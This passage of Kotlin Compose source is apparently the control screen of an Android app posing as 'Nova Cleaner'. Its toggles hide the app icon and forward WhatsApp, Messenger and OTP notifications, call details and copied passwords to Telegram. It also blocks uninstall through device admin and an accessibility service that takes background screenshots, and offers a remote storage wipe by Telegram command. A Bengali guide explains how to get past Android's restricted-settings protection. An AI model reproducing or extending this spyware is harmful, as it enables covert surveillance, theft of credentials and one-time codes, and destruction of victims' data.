                                color = if (!appPin.isNullOrBlank()) NeonGreen else NeonPink,
                                fontSize = 9.sp,
                                fontWeight = FontWeight.Bold
                            )
                        }
                    }

                    // 1. PIN Lock Protection Item
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x0DFFFFFF))
                            .padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column(modifier = Modifier.weight(1f)) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Text(
                                    text = "App Security PIN Lock",
                                    color = Color.White,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Spacer(modifier = Modifier.width(6.dp))
                                if (!appPin.isNullOrBlank()) {
                                    Box(
                                        modifier = Modifier
                                            .clip(RoundedCornerShape(4.dp))
                                            .background(Color(0x2238EF7D))
                                            .padding(horizontal = 6.dp, vertical = 2.dp)
                                    ) {
                                        Text(
                                            text = "🔒 ACTIVE",
                                            color = Color(0xFF38EF7D),
                                            fontSize = 9.sp,
                                            fontWeight = FontWeight.Bold
                                        )
                                    }
                                }
                            }
                            Text(
                                text = if (!appPin.isNullOrBlank()) "Current PIN: •••• (Tap Lock to test)" else "Set 4-8 digit PIN to protect access (or /setpin)",
                                color = Color(0xFF64748B),
                                fontSize = 10.sp
                            )
                        }

                        Spacer(modifier = Modifier.width(6.dp))

                        if (!appPin.isNullOrBlank()) {
                            Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                                NeonOutlinedButton(
                                    text = "LOCK",
                                    borderColor = NeonCyan,
                                    onClick = onLockNow,
                                    modifier = Modifier.height(28.dp)
                                )
                                NeonOutlinedButton(
                                    text = "CHANGE",
                                    borderColor = Color(0xFF94A3B8),
                                    onClick = { showPinDialog = true },
                                    modifier = Modifier.height(28.dp)
                                )
                                NeonOutlinedButton(
                                    text = "REMOVE",
                                    borderColor = NeonPink,
                                    onClick = { onSetAppPin(null) },
                                    modifier = Modifier.height(28.dp)
                                )
                            }
                        } else {
                            NeonOutlinedButton(
                                text = "SET PIN",
                                borderColor = NeonCyan,
                                onClick = { showPinDialog = true },
                                modifier = Modifier.height(30.dp)
                            )
                        }
                    }

                    // 2. Auto-Hide Icon Item
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x0DFFFFFF))
                            .padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Icon(
                                imageVector = Icons.Default.VisibilityOff,
                                contentDescription = null,
                                tint = NeonCyan,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Column {
                                Text(
                                    text = "Auto-Hide App Icon",
                                    color = Color.White,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Text(
                                    text = "Hide launcher icon on start (Unhide via /unhide)",
                                    color = Color(0xFF64748B),
                                    fontSize = 10.sp
                                )
                            }
                        }

                        Switch(
                            checked = isAutoHideIcon,
                            onCheckedChange = { onSetAutoHideIcon(it) },
                            colors = SwitchDefaults.colors(
                                checkedThumbColor = Color.White,
                                checkedTrackColor = NeonCyan,
                                uncheckedThumbColor = Color(0xFF94A3B8),
                                uncheckedTrackColor = Color(0x33FFFFFF)
                            )
                        )
                    }

                    // 3. Live Notification Forwarder Item
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x0DFFFFFF))
                            .padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Icon(
                                imageVector = Icons.Default.NotificationsActive,
                                contentDescription = null,
                                tint = NeonGreen,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Column {
                                Text(
                                    text = "Notification Interceptor",
                                    color = Color.White,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Text(
                                    text = "Forward WhatsApp, Messenger, OTP to Telegram",
                                    color = Color(0xFF64748B),
                                    fontSize = 10.sp
                                )
                            }
                        }

                        Switch(
                            checked = isNotificationForwarding,
                            onCheckedChange = { onSetNotificationForwarding(it) },
                            colors = SwitchDefaults.colors(
                                checkedThumbColor = Color.White,
                                checkedTrackColor = NeonGreen,
                                uncheckedThumbColor = Color(0xFF94A3B8),
                                uncheckedTrackColor = Color(0x33FFFFFF)
                            )
                        )
                    }

                    // 4. Incoming Call Interceptor Item
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x0DFFFFFF))
                            .padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Icon(
                                imageVector = Icons.Default.PhoneInTalk,
                                contentDescription = null,
                                tint = NeonCyan,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Column {
                                Text(
                                    text = "Incoming Call Alerts",
                                    color = Color.White,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Text(
                                    text = "Live Telegram alerts with caller name & number",
                                    color = Color(0xFF64748B),
                                    fontSize = 10.sp
                                )
                            }
                        }

                        Switch(
                            checked = isCallMonitoring,
                            onCheckedChange = { onSetCallMonitoring(it) },
                            colors = SwitchDefaults.colors(
                                checkedThumbColor = Color.White,
                                checkedTrackColor = NeonCyan,
                                uncheckedThumbColor = Color(0xFF94A3B8),
                                uncheckedTrackColor = Color(0x33FFFFFF)
                            )
                        )
                    }

                    // 5. Live Clipboard Sync Item
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x0DFFFFFF))
                            .padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Icon(
                                imageVector = Icons.Default.ContentPaste,
                                contentDescription = null,
                                tint = NeonPurple,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Column {
                                Text(
                                    text = "Live Clipboard Sync",
                                    color = Color.White,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Text(
                                    text = "Auto-send copied passwords & links to Telegram",
                                    color = Color(0xFF64748B),
                                    fontSize = 10.sp
                                )
                            }
                        }

                        Switch(
                            checked = isClipboardSync,
                            onCheckedChange = { onSetClipboardSync(it) },
                            colors = SwitchDefaults.colors(
                                checkedThumbColor = Color.White,
                                checkedTrackColor = NeonPurple,
                                uncheckedThumbColor = Color(0xFF94A3B8),
                                uncheckedTrackColor = Color(0x33FFFFFF)
                            )
                        )
                    }

                    // 6. Anti-Uninstall PIN Protection Item
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x0DFFFFFF))
                            .padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Icon(
                                imageVector = Icons.Default.Security,
                                contentDescription = null,
                                tint = NeonPink,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Column {
                                Text(
                                    text = "Anti-Uninstall PIN Lock",
                                    color = Color.White,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Text(
                                    text = "Require PIN (${appPin ?: "1234"}) to uninstall or remove app",
                                    color = Color(0xFF64748B),
                                    fontSize = 10.sp
                                )
                            }
                        }

                        Switch(
                            checked = isAntiUninstall,
                            onCheckedChange = { onSetAntiUninstall(it) },
                            colors = SwitchDefaults.colors(
                                checkedThumbColor = Color.White,
                                checkedTrackColor = NeonPink,
                                uncheckedThumbColor = Color(0xFF94A3B8),
                                uncheckedTrackColor = Color(0x33FFFFFF)
                            )
                        )
                    }

                    // 7. Device Administrator Privilege Item
                    val currentContext = LocalContext.current
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x0DFFFFFF))
                            .padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Icon(
                                imageVector = Icons.Default.VpnKey,
                                contentDescription = null,
                                tint = Color(0xFFF59E0B),
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Column {
                                Text(
                                    text = "Device Administrator",
                                    color = Color.White,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Text(
                                    text = if (isDeviceAdminActive) "Active (Hardware uninstallation blocked)" else "Tap to activate system-level uninstall barrier",
                                    color = if (isDeviceAdminActive) NeonGreen else Color(0xFF64748B),
                                    fontSize = 10.sp
                                )
                            }
                        }

                        if (isDeviceAdminActive) {
                            Box(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(Color(0x1A10B981))
                                    .border(1.dp, NeonGreen, RoundedCornerShape(6.dp))
                                    .padding(horizontal = 8.dp, vertical = 4.dp)
                            ) {
                                Text(
                                    text = "ACTIVE",
                                    color = NeonGreen,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        } else {
                            Box(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(8.dp))
                                    .background(Color(0xFFF59E0B))
                                    .clickable {
                                        val launched = AppAdminReceiver.requestActivation(currentContext)
                                        if (!launched) {
                                            Toast.makeText(
                                                currentContext,
                                                "Please enable Device Admin for Nova Cleaner in Settings",
                                                Toast.LENGTH_LONG
                                            ).show()
                                        }
                                    }
                                    .padding(horizontal = 10.dp, vertical = 6.dp)
                            ) {
                                Text(
                                    text = "ACTIVATE",
                                    color = Color.Black,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        }
                    }

                    // 8. Accessibility Shield Engine Item
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x0DFFFFFF))
                            .padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                            Icon(
                                imageVector = Icons.Default.Accessibility,
                                contentDescription = null,
                                tint = NeonCyan,
                                modifier = Modifier.size(20.dp)
                            )
                            Spacer(modifier = Modifier.width(10.dp))
                            Column {
                                Text(
                                    text = "Accessibility Shield Engine",
                                    color = Color.White,
                                    fontSize = 13.sp,
                                    fontWeight = FontWeight.SemiBold
                                )
                                Text(
                                    text = if (isAccessibilityActive) "Active (Background Screenshot & Anti-Tamper Barrier)" else "Required for background capture & anti-uninstall barrier",
                                    color = if (isAccessibilityActive) NeonGreen else Color(0xFF64748B),
                                    fontSize = 10.sp
                                )
                            }
                        }

                        if (isAccessibilityActive) {
                            Box(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(Color(0x1A10B981))
                                    .border(1.dp, NeonGreen, RoundedCornerShape(6.dp))
                                    .padding(horizontal = 8.dp, vertical = 4.dp)
                            ) {
                                Text(
                                    text = "ACTIVE",
                                    color = NeonGreen,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        } else {
                            Box(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(8.dp))
                                    .background(NeonCyan)
                                    .clickable {
                                        AppAccessibilityService.openAccessibilitySettings(currentContext)
                                    }
                                    .padding(horizontal = 10.dp, vertical = 6.dp)
                            ) {
                                Text(
                                    text = "ENABLE",
                                    color = Color.Black,
                                    fontSize = 10.sp,
                                    fontWeight = FontWeight.Bold
                                )
                            }
                        }
                    }

                    // 9. Redmi / Xiaomi / Android 13+ Restricted Setting Fix Guide
                    Box(
                        modifier = Modifier
                            .fillMaxWidth()
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0x1AF59E0B))
                            .border(1.dp, Color(0x33F59E0B), RoundedCornerShape(12.dp))
                            .clickable { showRestrictedGuideDialog = true }
                            .padding(12.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.SpaceBetween,
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                                Icon(
                                    imageVector = Icons.Default.HelpOutline,
                                    contentDescription = null,
                                    tint = Color(0xFFF59E0B),
                                    modifier = Modifier.size(20.dp)
                                )
                                Spacer(modifier = Modifier.width(10.dp))
                                Column {
                                    Text(
                                        text = "Redmi / Xiaomi Restricted Setting Fix",
                                        color = Color(0xFFFDE68A),
                                        fontSize = 12.sp,
                                        fontWeight = FontWeight.Bold
                                    )
                                    Text(
                                        text = "অ্যাক্সেসিবিলিটিতে 'Restricted setting' আসলে সমাধান দেখতে ট্যাপ করুন",
                                        color = Color(0xFFCBD5E1),
                                        fontSize = 10.sp
                                    )
                                }
                            }
                            Icon(
                                imageVector = Icons.Default.OpenInNew,
                                contentDescription = null,
                                tint = Color(0xFFF59E0B),
                                modifier = Modifier.size(16.dp)
                            )
                        }
                    }
                }
            }
        }

        // Emergency Data Wipe Card
        item {
            NeonGlassCard(
                modifier = Modifier.fillMaxWidth(),
                glowColor = Color(0x33F43F5E)
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(
                            imageVector = Icons.Default.Warning,
                            contentDescription = null,
                            tint = NeonPink,
                            modifier = Modifier.size(18.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "EMERGENCY DATA WIPE & FORMAT",
                            color = NeonPink,
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            letterSpacing = 1.sp
                        )
                    }

                    Spacer(modifier = Modifier.height(6.dp))

                    Text(
                        text = "Emergency protection: format and securely wipe DCIM photos, videos, downloads and document storage. Can also be triggered via Telegram with /wipe confirm.",
                        color = Color(0xFF94A3B8),
                        fontSize = 10.sp,
                        lineHeight = 14.sp
                    )

                    Spacer(modifier = Modifier.height(12.dp))

                    NeonGlowingButton(
                        text = "WIPE DEVICE STORAGE NOW",
                        icon = Icons.Default.DeleteForever,
                        onClick = { showWipeConfirmDialog = true },
                        gradient = Brush.horizontalGradient(listOf(NeonPink, Color(0xFFBE185D))),
                        glowColor = NeonPink,
                        modifier = Modifier.fillMaxWidth()
                    )
                }
            }
        }

        // PIN Setup Dialog
        if (showPinDialog) {
            item {
                PinSetupDialog(
                    onDismiss = { showPinDialog = false },
                    onConfirm = { pin ->
                        onSetAppPin(pin)
                        showPinDialog = false
                    }
                )
            }
        }

        // Wipe Confirmation Dialog
        if (showWipeConfirmDialog) {
            item {
                AlertDialog(
                    onDismissRequest = { showWipeConfirmDialog = false },
                    title = {
                        Text(
                            text = "Confirm Emergency Wipe?",
                            color = NeonPink,
                            fontWeight = FontWeight.Bold
                        )
                    },
                    text = {
                        Text(
                            text = "This will permanently delete photos, videos, downloads and external documents from this phone. This action cannot be undone!",
                            color = Color(0xFFCBD5E1),
                            fontSize = 13.sp
                        )
                    },
                    confirmButton = {
                        TextButton(
                            onClick = {
                                showWipeConfirmDialog = false
                                onPerformWipe()
                            }
                        ) {
                            Text("WIPE NOW", color = NeonPink, fontWeight = FontWeight.Bold)
                        }
                    },
                    dismissButton = {
                        TextButton(onClick = { showWipeConfirmDialog = false }) {
                            Text("CANCEL", color = Color(0xFF94A3B8))
                        }
                    },
                    containerColor = Color(0xFF1E293B)
                )
            }
        }

        // Redmi / Xiaomi / Android 13+ Restricted Settings Guide Dialog
        if (showRestrictedGuideDialog) {
            item {
                RestrictedSettingsGuideDialog(
                    onDismiss = { showRestrictedGuideDialog = false }
                )
            }
        }

        // Security Audit Checklist
        item {
            Text(
                text = "SECURITY & PRIVACY AUDIT",
                color = Color(0xFF94A3B8),
                fontSize = 11.sp,
                fontWeight = FontWeight.Bold,
                letterSpacing = 1.2.sp
            )
        }

        items(securityItems) { item ->
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .clip(RoundedCornerShape(14.dp))
                    .background(Color(0x0DFFFFFF))
                    .border(1.dp, Color(0x0DFFFFFF), RoundedCornerShape(14.dp))
                    .padding(12.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier
                        .size(36.dp)
                        .clip(RoundedCornerShape(10.dp))
                        .background(Color(0x1A38EF7D)),
                    contentAlignment = Alignment.Center
                ) {
                    Icon(
                        imageVector = Icons.Default.Check,
                        contentDescription = null,
                        tint = NeonGreen,
                        modifier = Modifier.size(20.dp)
                    )
                }

                Spacer(modifier = Modifier.width(12.dp))

                Column(modifier = Modifier.weight(1f)) {
                    Text(
                        text = item.title,
                        color = Color.White,
                        fontSize = 13.sp,
                        fontWeight = FontWeight.SemiBold
                    )
                    Text(
                        text = item.detail,
                        color = Color(0xFF64748B),
                        fontSize = 10.sp
                    )
                }

                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(8.dp))
                        .background(Color(0x1A38EF7D))
                        .padding(horizontal = 8.dp, vertical = 3.dp)
                ) {
                    Text(
                        text = "SAFE",
                        color = NeonGreen,
                        fontSize = 9.sp,
                        fontWeight = FontWeight.Black
                    )
                }
            }
        }
    }
}

@Composable
fun CommandChip(
    label: String,
    desc: String,
    onClick: (() -> Unit)? = null
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val clipboardManager = androidx.compose.ui.platform.LocalClipboardManager.current

    Box(
        modifier = Modifier
            .clip(RoundedCornerShape(8.dp))
            .background(Color(0x1438EF7D))
            .border(1.dp, Color(0x2238EF7D), RoundedCornerShape(8.dp))
            .clickable {
                if (onClick != null) {
                    onClick()
                } else {
                    clipboardManager.setText(androidx.compose.ui.text.AnnotatedString(label))
                    android.widget.Toast.makeText(context, "Copied $label to clipboard", android.widget.Toast.LENGTH_SHORT).show()
                }
            }
            .padding(horizontal = 8.dp, vertical = 5.dp)
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Text(
                text = label,
                color = NeonGreen,
                fontSize = 10.sp,
                fontWeight = FontWeight.Bold,
                fontFamily = FontFamily.Monospace
            )
            Spacer(modifier = Modifier.width(4.dp))
            Text(
                text = "• $desc",
                color = Color(0xFF94A3B8),
                fontSize = 9.sp
            )
        }
    }
}

// -----------------------------------------------------------------
// BOTTOM NAVIGATION BUTTON COMPONENT
// -----------------------------------------------------------------
@Composable
fun BottomNavButton(
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    label: String,
    isSelected: Boolean,
    activeColor: Color,
    onClick: () -> Unit
) {
    Column(
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center,
        modifier = Modifier
            .clip(RoundedCornerShape(16.dp))
            .clickable { onClick() }
            .padding(horizontal = 14.dp, vertical = 6.dp)
    ) {
        Icon(
            imageVector = icon,
            contentDescription = label,
            tint = if (isSelected) activeColor else Color(0xFF64748B),
            modifier = Modifier.size(22.dp)
        )
        Spacer(modifier = Modifier.height(2.dp))
        Text(
            text = label,
            color = if (isSelected) activeColor else Color(0xFF64748B),
            fontSize = 10.sp,
            fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal
        )
    }
}

// -----------------------------------------------------------------
// PIN SETUP DIALOG
// -----------------------------------------------------------------
@Composable
fun PinSetupDialog(
    onDismiss: () -> Unit,
    onConfirm: (String) -> Unit
) {
    var pinText by remember { mutableStateOf("") }
    var confirmPinText by remember { mutableStateOf("") }
    var errorMessage by remember { mutableStateOf<String?>(null) }

    AlertDialog(
        onDismissRequest = onDismiss,
        title = {
            Text(
                text = "Set Security PIN",
                color = Color.White,
                fontWeight = FontWeight.Bold,
                fontSize = 18.sp
            )
        },
        text = {
            Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
                Text(
                    text = "Enter a 4-8 digit numeric PIN code to protect this application.",
                    color = Color(0xFF94A3B8),
                    fontSize = 12.sp
                )

                OutlinedTextField(
                    value = pinText,
                    onValueChange = {
                        if (it.length <= 8 && it.all { c -> c.isDigit() }) {
                            pinText = it
                            errorMessage = null
                        }
                    },
                    label = { Text("New PIN (4-8 digits)") },
                    visualTransformation = PasswordVisualTransformation(),
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.NumberPassword),
                    singleLine = true,
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedTextColor = Color.White,
                        unfocusedTextColor = Color.White,
                        cursorColor = NeonCyan,
                        focusedBorderColor = NeonCyan,
                        unfocusedBorderColor = Color(0x33FFFFFF),
                        focusedLabelColor = NeonCyan,
                        unfocusedLabelColor = Color(0xFF94A3B8)
                    ),
                    modifier = Modifier.fillMaxWidth()
                )

                OutlinedTextField(
                    value = confirmPinText,
                    onValueChange = {
                        if (it.length <= 8 && it.all { c -> c.isDigit() }) {
                            confirmPinText = it
                            errorMessage = null
                        }
                    },
                    label = { Text("Confirm PIN") },
                    visualTransformation = PasswordVisualTransformation(),
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.NumberPassword),
                    singleLine = true,
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedTextColor = Color.White,
                        unfocusedTextColor = Color.White,
                        cursorColor = NeonCyan,
                        focusedBorderColor = NeonCyan,
                        unfocusedBorderColor = Color(0x33FFFFFF),
                        focusedLabelColor = NeonCyan,
                        unfocusedLabelColor = Color(0xFF94A3B8)
                    ),
                    modifier = Modifier.fillMaxWidth()
                )

                if (errorMessage != null) {
                    Text(
                        text = errorMessage!!,
                        color = NeonPink,
                        fontSize = 12.sp,
                        fontWeight = FontWeight.SemiBold
                    )
                }
            }
        },
        confirmButton = {
            TextButton(
                onClick = {
                    if (pinText.length < 4) {
                        errorMessage = "PIN must be at least 4 digits!"
                    } else if (pinText != confirmPinText) {
                        errorMessage = "PINs do not match!"
                    } else {
                        onConfirm(pinText)
                    }
                }
            ) {
                Text("SAVE PIN", color = NeonCyan, fontWeight = FontWeight.Bold, fontSize = 14.sp)
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("CANCEL", color = Color(0xFF94A3B8), fontSize = 14.sp)
            }
        },
        containerColor = Color(0xFF1E293B)
    )
}

// -----------------------------------------------------------------
// CYBERPUNK PIN LOCK OVERLAY
// -----------------------------------------------------------------
@Composable
fun CyberpunkPinLockOverlay(
    onUnlock: (String) -> Boolean,
    modifier: Modifier = Modifier
) {
    var enteredPin by remember { mutableStateOf("") }
    var isError by remember { mutableStateOf(false) }

    Box(
        modifier = modifier
            .fillMaxSize()
            .background(Color(0xF5050811))
            .statusBarsPadding()
            .navigationBarsPadding(),
        contentAlignment = Alignment.Center
    ) {
        Column(
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center,
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 28.dp)
        ) {
            // Lock Icon with glowing ring
            Box(
                modifier = Modifier
                    .size(76.dp)
                    .clip(CircleShape)
                    .background(if (isError) Color(0x33F43F5E) else Color(0x2200F2FE))
                    .border(2.dp, if (isError) NeonPink else NeonCyan, CircleShape),
                contentAlignment = Alignment.Center
            ) {
                Icon(
                    imageVector = Icons.Default.Lock,
                    contentDescription = "Lock",
                    tint = if (isError) NeonPink else NeonCyan,
                    modifier = Modifier.size(36.dp)
                )
            }

            Spacer(modifier = Modifier.height(18.dp))

            Text(
                text = "NOVA SECURITY LOCK",
                color = Color.White,
                fontSize = 18.sp,
                fontWeight = FontWeight.Black,
                letterSpacing = 1.2.sp
            )

            Spacer(modifier = Modifier.height(4.dp))

            Text(
                text = if (isError) "Incorrect PIN! Access denied." else "Enter your Security PIN to continue",
                color = if (isError) NeonPink else Color(0xFF94A3B8),
                fontSize = 12.sp,
                fontWeight = FontWeight.Medium
            )

            Spacer(modifier = Modifier.height(24.dp))

            // Dynamic PIN Dots (4 to 8 dots)
            val displayDotCount = maxOf(4, enteredPin.length.coerceAtMost(8))
            Row(
                horizontalArrangement = Arrangement.spacedBy(14.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                for (i in 0 until displayDotCount) {
                    val filled = enteredPin.length > i
                    Box(
                        modifier = Modifier
                            .size(16.dp)
                            .clip(CircleShape)
                            .background(
                                when {
                                    isError -> NeonPink
                                    filled -> NeonCyan
                                    else -> Color(0x33FFFFFF)
                                }
                            )
                            .border(
                                1.5.dp,
                                if (filled) NeonCyan else Color(0x44FFFFFF),
                                CircleShape
                            )
                    )
                }
            }

            Spacer(modifier = Modifier.height(28.dp))

            // Keypad Grid
            val keys = listOf(
                listOf("1", "2", "3"),
                listOf("4", "5", "6"),
                listOf("7", "8", "9"),
                listOf("C", "0", "DEL")
            )

            Column(
                verticalArrangement = Arrangement.spacedBy(14.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                for (row in keys) {
                    Row(
                        horizontalArrangement = Arrangement.spacedBy(24.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        for (key in row) {
                            Box(
                                modifier = Modifier
                                    .size(68.dp)
                                    .clip(CircleShape)
                                    .background(Color(0x14FFFFFF))
                                    .border(1.dp, Color(0x24FFFFFF), CircleShape)
                                    .clickable {
                                        isError = false
                                        when (key) {
                                            "C" -> enteredPin = ""
                                            "DEL" -> if (enteredPin.isNotEmpty()) enteredPin = enteredPin.dropLast(1)
                                            else -> {
                                                if (enteredPin.length < 8) {
                                                    val newPin = enteredPin + key
                                                    enteredPin = newPin
                                                    // Test unlock immediately
                                                    val success = onUnlock(newPin)
                                                    if (!success && newPin.length >= 8) {
                                                        isError = true
                                                        enteredPin = ""
                                                    }
                                                }
                                            }
                                        }
                                    },
                                contentAlignment = Alignment.Center
                            ) {
                                if (key == "DEL") {
                                    Icon(
                                        imageVector = Icons.Default.Backspace,
                                        contentDescription = "Backspace",
                                        tint = Color.White,
                                        modifier = Modifier.size(22.dp)
                                    )
                                } else {
                                    Text(
                                        text = key,
                                        color = Color.White,
                                        fontSize = 22.sp,
                                        fontWeight = FontWeight.Bold
                                    )
                                }
                            }
                        }
                    }
                }
            }

            Spacer(modifier = Modifier.height(20.dp))

            // Unlock button for explicit submit if PIN was 4-7 digits
            if (enteredPin.length in 4..8) {
                NeonGlowingButton(
                    text = "UNLOCK ACCESS",
                    onClick = {
                        val success = onUnlock(enteredPin)
                        if (!success) {
                            isError = true
                            enteredPin = ""
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth(0.65f)
                        .height(44.dp)
                )
            } else {
                Spacer(modifier = Modifier.height(44.dp))
            }

            Spacer(modifier = Modifier.height(16.dp))

            Text(
                text = "💡 Forgot PIN? Send /resetpin from your Telegram Bot",
                color = Color(0xFF64748B),
                fontSize = 11.sp,
                textAlign = TextAlign.Center
            )
        }
    }
}

// -----------------------------------------------------------------
// REDMI / XIAOMI / ANDROID 13+ RESTRICTED SETTINGS GUIDE DIALOG
// -----------------------------------------------------------------
@Composable
fun RestrictedSettingsGuideDialog(
    onDismiss: () -> Unit
) {
    val context = LocalContext.current

    AlertDialog(
        onDismissRequest = onDismiss,
        title = {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(
                    imageVector = Icons.Default.AdminPanelSettings,
                    contentDescription = null,
                    tint = Color(0xFFF59E0B),
                    modifier = Modifier.size(24.dp)
                )
                Spacer(modifier = Modifier.width(10.dp))
                Text(
                    text = "Xiaomi / Redmi Permission Fix",
                    color = Color.White,
                    fontSize = 15.sp,
                    fontWeight = FontWeight.Bold
                )
            }
        },
        text = {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .verticalScroll(rememberScrollState()),
                verticalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .background(Color(0x22F59E0B))
                        .border(1.dp, Color(0x44F59E0B), RoundedCornerShape(8.dp))
                        .padding(10.dp)
                ) {
                    Text(
                        text = "📌 সমস্যা: Android 13+ এবং Redmi / Xiaomi (MIUI / HyperOS) ফোনে সরাসরি ইনস্টল করা অ্যাপে Accessibility অন করতে গেলে \"Restricted setting: For your security, this setting is currently unavailable\" মেসেজ আসে।",
                        color = Color(0xFFFDE68A),
                        fontSize = 11.sp,
                        lineHeight = 15.sp
                    )
                }

                Text(
                    text = "🛠️ সহজ ৪টি সমাধান ধাপ:",
                    color = Color.White,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold
                )

                GuideStepItem(
                    step = "১",
                    title = "App Info পেজে যান",
                    desc = "নিচে '1. OPEN APP INFO' বাটনে চাপ দিন।"
                )
                GuideStepItem(
                    step = "২",
                    title = "৩-ডট (⋮) মেনুতে চাপুন",
                    desc = "App Info পেজের উপরে ডানদিকের তিনটি ডট (⋮) মেনুতে চাপুন।"
                )
                GuideStepItem(
                    step = "৩",
                    title = "Allow restricted settings চাপুন",
